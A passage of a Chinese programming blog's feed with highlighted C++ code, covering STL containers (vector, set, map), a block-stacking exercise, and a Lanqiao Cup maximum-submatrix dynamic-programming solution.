&#123;</span><br><span class="line">    <span class="keyword">if</span>(s[i]==<span class="string">&#x27;L&#x27;</span>)balance++;</span><br><span class="line">    <span class="keyword">if</span>(s[i]==<span class="string">&#x27;R&#x27;</span>)balance--;</span><br><span class="line">    <span class="keyword">if</span>(balance==<span class="number">0</span>)result++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;优点：简单，高效，省去了为了找最优解可能需要穷举操作，通常作为其它算法的辅助算法来使用；&lt;/p&gt;
&lt;p&gt;缺点：不从总体上考虑其它可能情况，每次选取局部最优解，不再进行回溯处理，所以很少情况下得到最优解。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;每一步都选取当前状态下最好的选</summary>
      
    
    
    
    <category term="算法(C++)" scheme="https://zss192.github.io/categories/%E7%AE%97%E6%B3%95-C/"/>
    
    
    <category term="算法(C++)" scheme="https://zss192.github.io/tags/%E7%AE%97%E6%B3%95-C/"/>
    
  </entry>
  
  <entry>
    <title>STL知识点</title>
    <link href="https://zss192.github.io/2021/03/21/STL%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
    <id>https://zss192.github.io/2021/03/21/STL%E7%9F%A5%E8%AF%86%E7%82%B9/</id>
    <published>2021-03-21T03:47:00.000Z</published>
    <updated>2021-03-30T03:48:10.017Z</updated>
    
    <content type="html"><![CDATA[<h1>STL知识点</h1><p>STL，即标准模板库或者泛型库，其包含有大量的模板类和模板函数，是 C++ 提供的一个基础模板的集合，用于完成诸如输入/输出、数学计算等功能。可以理解成动态数组</p><p>优点：举个例子，定义一个数组int a[n]，这种方法必须事先确定好长度，而如果无法事先确定长度一般都会把n设的比较大，就会造成空间的浪费。用指针则会比较麻烦，而STL可以很好地解决这个问题，而且所有容器和算法都是总结了几十年来算法和数据结构的研究成果。</p><h2 id="1-vector容器"><a class="header-anchor" href="#1-vector容器">¶</a>1.vector容器</h2><h3 id="🧨简单用法"><a class="header-anchor" href="#🧨简单用法">¶</a>🧨简单用法</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建一个向量存储 int</span></span><br><span class="line"> vector&lt;<span class="keyword">int</span>&gt; vec; </span><br><span class="line"> <span class="keyword">int</span> i;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// 显示 vec 的原始大小</span></span><br><span class="line"> cout &lt;&lt; <span class="string">&quot;vector size = &quot;</span> &lt;&lt; vec.<span class="built_in">size</span>() &lt;&lt; endl;  <span class="comment">//0</span></span><br><span class="line"> </span><br><span class="line"> <span class="comment">// 推入 5 个值到向量中</span></span><br><span class="line"> <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)&#123;</span><br><span class="line">    vec.<span class="built_in">push_back</span>(i);</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// 显示 vec 扩展后的大小</span></span><br><span class="line"> cout &lt;&lt; <span class="string">&quot;extended vector size = &quot;</span> &lt;&lt; vec.<span class="built_in">size</span>() &lt;&lt; endl;   <span class="comment">//5</span></span><br><span class="line"> </span><br><span class="line"> <span class="comment">// 访问向量中的 5 个值</span></span><br><span class="line"> <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;value of vec [&quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;] = &quot;</span> &lt;&lt; vec[i] &lt;&lt; endl; <span class="comment">//0 1 2 3 4</span></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="🏄🏼‍♂️进阶用法"><a class="header-anchor" href="#🏄🏼‍♂️进阶用法">¶</a>🏄🏼‍♂️进阶用法</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;<span class="keyword">int</span>&gt; vec;   <span class="comment">//[]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 插入元素(在末尾)</span></span><br><span class="line">vec.<span class="built_in">push_back</span>(<span class="number">1</span>);  <span class="comment">//[1]</span></span><br><span class="line">vec.<span class="built_in">push_back</span>(<span class="number">2</span>);  <span class="comment">//[1,2]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除元素(也是删末尾的那个)</span></span><br><span class="line">vec.<span class="built_in">pop_back</span>();    <span class="comment">//[1]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 清空vector</span></span><br><span class="line">vec.<span class="built_in">clear</span>();       <span class="comment">//[]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用迭代器 iterator 访问值</span></span><br><span class="line"><span class="comment">//注意begin指向第一个元素，而end指向的是最后一个元素的下一个位置</span></span><br><span class="line">vector&lt;<span class="keyword">int</span>&gt;::iterator v = vec.<span class="built_in">begin</span>();</span><br><span class="line"><span class="keyword">while</span>( v != vec.<span class="built_in">end</span>()) &#123;    <span class="comment">//如果等于end说明前面有效元素都访问了</span></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;value of v = &quot;</span> &lt;&lt; *v &lt;&lt; endl;  <span class="comment">//0 1 2 3 4</span></span><br><span class="line">v++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//排序</span></span><br><span class="line"><span class="built_in">sort</span>(vec.<span class="built_in">begin</span>(),vec.<span class="built_in">end</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造函数初始化</span></span><br><span class="line"><span class="keyword">int</span> n=<span class="number">10</span>;</span><br><span class="line"><span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">vec</span><span class="params">(n,<span class="number">1</span>)</span></span>;  <span class="comment">//相当于push_back了10个1</span></span><br><span class="line"><span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">vec</span><span class="params">(n)</span></span>;    <span class="comment">//不传初始值，默认为0即10个0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义二维数组</span></span><br><span class="line">vector&lt;vector&lt;<span class="keyword">int</span>&gt; &gt; vec2;</span><br></pre></td></tr></table></figure><h2 id="2-set集合（不存在重复元素）"><a class="header-anchor" href="#2-set集合（不存在重复元素）">¶</a>2.set集合（不存在重复元素）</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建集合</span></span><br><span class="line">set&lt;string&gt; country;   <span class="comment">//&#123;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 插入元素</span></span><br><span class="line">country.<span class="built_in">insert</span>(<span class="string">&quot;China&quot;</span>);      <span class="comment">//&#123;&quot;China&quot;&#125;</span></span><br><span class="line">country.<span class="built_in">insert</span>(<span class="string">&quot;America&quot;</span>);    <span class="comment">//&#123;&quot;China&quot;,America&quot;&#125;</span></span><br><span class="line"><span class="comment">//如果插入已经存在的元素不会产生任何效果</span></span><br><span class="line">country.<span class="built_in">insert</span>(<span class="string">&quot;China&quot;</span>);      <span class="comment">//&#123;&quot;China&quot;,&quot;America&quot;&#125;  </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除元素</span></span><br><span class="line">country.<span class="built_in">erase</span>(<span class="string">&quot;America&quot;</span>);     <span class="comment">//&#123;&quot;China&quot;&#125;</span></span><br><span class="line"><span class="comment">//如果删除的元素不存在也不会产生任何效果</span></span><br><span class="line">country.<span class="built_in">erase</span>(<span class="string">&quot;Japan&quot;</span>);       <span class="comment">//&#123;&quot;China&quot;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 确定某元素是否存在</span></span><br><span class="line">country.<span class="built_in">count</span>(<span class="string">&quot;China&quot;</span>);       <span class="comment">//若存在返回1否则返回0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用迭代器 iterator 访问值(类似于vector)</span></span><br><span class="line"><span class="comment">// 注意set集合会自动排序，如若先前插入了2543则会输出2345</span></span><br><span class="line"><span class="keyword">for</span> (set&lt;string&gt;::iterator it=country.<span class="built_in">begin</span>();it!=country.<span class="built_in">end</span>();it++)</span><br><span class="line">&#123;</span><br><span class="line">      cout &lt;&lt; *it &lt;&lt; endl;    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 清空set</span></span><br><span class="line">set.<span class="built_in">clear</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 也可以用来存结构体，但结构体没法判断顺序需要手动设置</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">people</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    string name;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="built_in">people</span>(string _name,<span class="keyword">int</span> _age)</span><br><span class="line">    &#123;</span><br><span class="line">        name=_name;</span><br><span class="line">        age=_age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//按照年龄排序</span></span><br><span class="line">    <span class="keyword">bool</span> <span class="keyword">operator</span>&lt;(<span class="keyword">const</span> people &amp;rhs) <span class="keyword">const</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> age &lt; rhs.age;    <span class="comment">//这里直接返回了，如果年龄可能相同那么要判断下如果年龄相同那就用姓名比较</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">set&lt;people&gt; s;</span><br><span class="line">s.<span class="built_in">insert</span>(<span class="built_in">people</span>(<span class="string">&quot;bob&quot;</span>,<span class="number">10</span>));s.<span class="built_in">insert</span>(<span class="built_in">people</span>(<span class="string">&quot;alice&quot;</span>,<span class="number">20</span>));s.<span class="built_in">insert</span>(<span class="built_in">people</span>(<span class="string">&quot;linda&quot;</span>,<span class="number">15</span>));</span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> (set&lt;people&gt;::iterator it=s.<span class="built_in">begin</span>();it!=s.<span class="built_in">end</span>();it++)</span><br><span class="line">&#123;</span><br><span class="line">       cout &lt;&lt; it-&gt;name &lt;&lt;<span class="string">&quot;  &quot;</span>&lt;&lt;it-&gt;age &lt;&lt;endl;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-map字典映射-一对一映射"><a class="header-anchor" href="#3-map字典映射-一对一映射">¶</a>3.map字典映射(一对一映射)</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个map</span></span><br><span class="line">map&lt;string,<span class="keyword">int</span>&gt; dict;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 插入元素</span></span><br><span class="line">dict[<span class="string">&quot;Tom&quot;</span>]=<span class="number">3</span>;                       <span class="comment">//dict[key]=value,这种遍历时不会排序</span></span><br><span class="line"><span class="comment">//这样遍历时可以通过it-&gt;first(Tom)和it-&gt;second(3)取值</span></span><br><span class="line">dict.<span class="built_in">insert</span>(<span class="built_in">make_pair</span>(<span class="string">&quot;Tom&quot;</span>,<span class="number">3</span>));   <span class="comment">//而且遍历时会按key(这里是string)排序  </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 取元素</span></span><br><span class="line">dict[<span class="string">&quot;Tom&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断关键字是否存在</span></span><br><span class="line">dict.<span class="built_in">count</span>(<span class="string">&quot;Tom&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取个数</span></span><br><span class="line">dict.<span class="built_in">size</span>();</span><br></pre></td></tr></table></figure><h2 id="例题讲解"><a class="header-anchor" href="#例题讲解">¶</a>例题讲解</h2><p>🚩1.n块积木，编号1到n，初始时，第i块放在第i个位置。现在，进行a b操作，每次操作把b位置积木全放到a位置上。输出操作完之后每个位置上的木块。<br>输入:n,m。n代表有n个积木，m代表有m个操作（1≤n≤10000，1≤m≤10000）</p><p>接下来m行是m个操作。如果ab相等则本次不移动木块。</p><p>输出每个位置从下到上的积木编号，如果该位置没有积木，输出一行空行。</p><p>样例输入：</p><p>4 4</p><p>3 1</p><p>4 3</p><p>2 4</p><p>2 2</p><p>样例输出：（为了更直观此处用*表示换行，代码里是按题意）</p><p>/*<br>2 4 3 1*<br>*<br>*</p><p>思路：如果用数组会爆内存(n和m范围都很大而且还要移动)，所以用动态数组，而且用动态数组刚好每一个vec[i]代表一个位置如下图所示</p><p>每个位置放的积木数也可以不确定，通过vec[1][0]、vec[1][1]可以得到对应的数值</p><p>对于每一个ab操作，对vec[b]遍历将里面的积木都push到vec[a]中再清空vec[b]即可</p><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20210321120147976.png"  alt="在这里插入图片描述"></p><p>🦄代码如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,m;    <span class="comment">//n个积木，m个操作</span></span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line"></span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; vec[<span class="number">10010</span>];   <span class="comment">//vec[i]相当于一个vector里面可以放若干整数,对应n个位置</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        vec[i].<span class="built_in">push_back</span>(i);  <span class="comment">//c[i]位置放编号为i的积木</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 进行a b操作</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> a,b;</span><br><span class="line">        cin&gt;&gt;a&gt;&gt;b;</span><br><span class="line">        <span class="keyword">if</span>(a==b)    <span class="comment">//若相等不进行任何操作</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; vec[b].<span class="built_in">size</span>(); j++)   <span class="comment">//对于c[b]位置的积木遍历</span></span><br><span class="line">            &#123;</span><br><span class="line">                vec[a].<span class="built_in">push_back</span>(vec[b][j]);    <span class="comment">//将c[b]位置的积木全部push到c[a]位置</span></span><br><span class="line">            &#125;</span><br><span class="line">            vector&lt;<span class="keyword">int</span>&gt;().<span class="built_in">swap</span>(vec[b]);       <span class="comment">//清空c[b]且释放内存</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出结果</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; vec[i].<span class="built_in">size</span>(); j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(j!=vec[i].<span class="built_in">size</span>()<span class="number">-1</span>)</span><br><span class="line">                cout&lt;&lt;vec[i][j]&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">            <span class="keyword">else</span>   </span><br><span class="line">                cout&lt;&lt;vec[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;STL知识点&lt;/h1&gt;
&lt;p&gt;STL，即标准模板库或者泛型库，其包含有大量的模板类和模板函数，是 C++ 提供的一个基础模板的集合，用于完成诸如输入/输出、数学计算等功能。可以理解成动态数组&lt;/p&gt;
&lt;p&gt;优点：举个例子，定义一个数组int a[n]，这种方法必须事先确定</summary>
      
    
    
    
    <category term="算法(C++)" scheme="https://zss192.github.io/categories/%E7%AE%97%E6%B3%95-C/"/>
    
    
    <category term="算法(C++)" scheme="https://zss192.github.io/tags/%E7%AE%97%E6%B3%95-C/"/>
    
  </entry>
  
  <entry>
    <title>蓝桥杯-最大子阵(C++详细解释版)</title>
    <link href="https://zss192.github.io/2021/03/19/%E8%93%9D%E6%A1%A5%E6%9D%AF-%E6%9C%80%E5%A4%A7%E5%AD%90%E9%98%B5-C-%E8%AF%A6%E7%BB%86%E8%A7%A3%E9%87%8A%E7%89%88/"/>
    <id>https://zss192.github.io/2021/03/19/%E8%93%9D%E6%A1%A5%E6%9D%AF-%E6%9C%80%E5%A4%A7%E5%AD%90%E9%98%B5-C-%E8%AF%A6%E7%BB%86%E8%A7%A3%E9%87%8A%E7%89%88/</id>
    <published>2021-03-19T11:30:00.000Z</published>
    <updated>2021-03-30T03:46:51.585Z</updated>
    
    <content type="html"><![CDATA[<h1>题目描述</h1><p>给定一个n*m的矩阵A，求A中的一个非空子矩阵，使这个子矩阵中的元素和最大。</p><p>其中，A的子矩阵指在A中行和列均连续的一块。</p><p>样例说明<br>取最后一列，和为10。<br>数据规模和约定<br>对于100%的数据，1&lt; =n, m&lt; =500，A中每个元素的绝对值不超过5000。</p><p>输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入的第一行包含两个整数n, m，分别表示矩阵A的行数和列数。 </span><br><span class="line">接下来n行，每行m个整数，表示矩阵A。 </span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输出一行，包含一个整数，表示A中最大的子矩阵中的元素和。 </span><br></pre></td></tr></table></figure><p>样例输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">3 3 </span><br><span class="line">-1 -4 3</span><br><span class="line">3 4 -1</span><br><span class="line">-5 -2 8</span><br></pre></td></tr></table></figure><p>样例输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10</span><br></pre></td></tr></table></figure><p>题目在这：<a href="https://www.dotcpp.com/oj/problem1445.html"><strong>题目 1445: [蓝桥杯][历届试题]最大子阵</strong></a></p><h1>题目分析</h1><p>假设现在有个一维数组nums[4]={-1,2,3,-4}。</p><p>如果要求他的最大连续子序列的和，假设max_sum[i]表示以第i个元素结尾的连续子序列的最大和，可以推出max_sum[i]=max(max_sum[i-1]+nums[i],nums[i])</p><blockquote><p>可以理解为比如max_sum[2]它的值为max(max_sum[1]+nums[2],nums[2])，因为必须包含nums[2]，所以如果max_sum[1]&gt;0那肯定加上max_sum[1]最大，而如果max_sum[1]&lt;0那加上他反而更小。所以取这两个的最大值</p></blockquote><p>这是求一维数组的最大子序列和，而题目要求的是二维数组的最大子序列和。</p><p>如果能把题目中求二维变成求一维就好了，其实是可以的。</p><p>我们可以看下面这样一个数组，其中ai表示第i行</p><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/img_convert/c1e8bd87984f77d8ef38424afae4e532.png"  alt="image-20210318180509897"></p><p>如果要求它的最大子阵，我们可以变成这样</p><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/img_convert/82605d992d320644f9befb595ac61cf7.png"  alt="image-20210318180706949"></p><p>如图所示，可以用一维数组分别表示第一行、第一行加第二行、第一行加第二行加第三行…</p><p>这样求它们每个的最大子序列和，然后其中最大的数值就是题目所求</p><blockquote><p>假设最大子矩阵是右下角那四个的和，那么等效为a2+a3的子序列最大和</p><p>假设最大子矩阵是9、2、-4、1、-1、8左下角那块，它们等效为a1+a2+a3的子序列最大和</p><p>由此我们可以看出无论最大子矩阵是在哪一块，图中红色方框中的10行一定有一行求得的最大子序列的值可以表示它们</p></blockquote><p>这样的话，题目则由求二维数组最大子矩阵的和转变为求图中红色方框那10行哪一行的最大子序列的和最大。我们只要单独求出每一个的最大值，在找到它们的最大值的最大值即可。</p><h1>代码</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//定义变量，读入输入的值存入数组，没什么说的</span></span><br><span class="line"> <span class="keyword">int</span> n,m;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    <span class="keyword">int</span> num[<span class="number">510</span>][<span class="number">510</span>];</span><br><span class="line">    <span class="keyword">int</span> dp[<span class="number">510</span>];</span><br><span class="line">    <span class="keyword">int</span> temp[<span class="number">510</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;m;j++)&#123;</span><br><span class="line">            cin&gt;&gt;num[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> result = num[<span class="number">0</span>][<span class="number">0</span>];    <span class="comment">//先将结果其设为第一个数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//核心代码</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="built_in">memset</span>(temp,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(temp));<span class="comment">//数组清零</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=i;j&lt;n;j++)&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//上面两层循环可以确定从i行到j行即ai+..+aj</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;m;k++)&#123;</span><br><span class="line">                temp[k] += num[j][k];<span class="comment">//第一次temp数组存的是a0(i=0,j=0),第二次是存的a0+a1(i=0,j=1)</span></span><br><span class="line">            &#125;<span class="comment">//因为第二次时temp[0]还存着num[0][0]呢即存着第一行的值，加上第二行即a0+a1</span></span><br><span class="line"></span><br><span class="line">            <span class="built_in">memset</span>(dp,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(dp));</span><br><span class="line"></span><br><span class="line">            <span class="comment">//对当前temp一维数组求最大子序列和，第一次是求a0,第二次是求a0+a1</span></span><br><span class="line">            dp[<span class="number">0</span>] = temp[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> u=<span class="number">1</span>;u&lt;m;u++)&#123;</span><br><span class="line">                dp[u] = <span class="built_in">max</span>(dp[u<span class="number">-1</span>]+temp[u],temp[u]);<span class="comment">//一维数组求最大子序列和</span></span><br><span class="line"><span class="comment">//如果这次求得的和大于目前最大值则更新</span></span><br><span class="line">                <span class="keyword">if</span>(dp[u]&gt;result)</span><br><span class="line">                    result = dp[u];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;result&lt;&lt;endl;</span><br><span class="line"><span class="comment">//  temp数组每次存的值如下</span></span><br><span class="line"><span class="comment">//  -1 -4  3   a0</span></span><br><span class="line"><span class="comment">//  2  0   2   a0+a1</span></span><br><span class="line"><span class="comment">// -3  -2 10   a0+a1+a2</span></span><br><span class="line"><span class="comment">// 3  4  -1 a1</span></span><br><span class="line"><span class="comment">// -2  2   7 a1+a2</span></span><br><span class="line"><span class="comment">// -5 -2  8 a2</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>参考</h1><p><a href="https://blog.csdn.net/Jaster_wisdom/article/details/79671736">蓝桥杯-最大子阵 动态规划</a></p><p><a href="https://frostime.github.io/2019/06/02/%E6%9C%80%E5%A4%A7%E5%AD%90%E9%98%B5%E5%92%8C/">最大子阵和</a></p>]]></content>
    
    
      
      
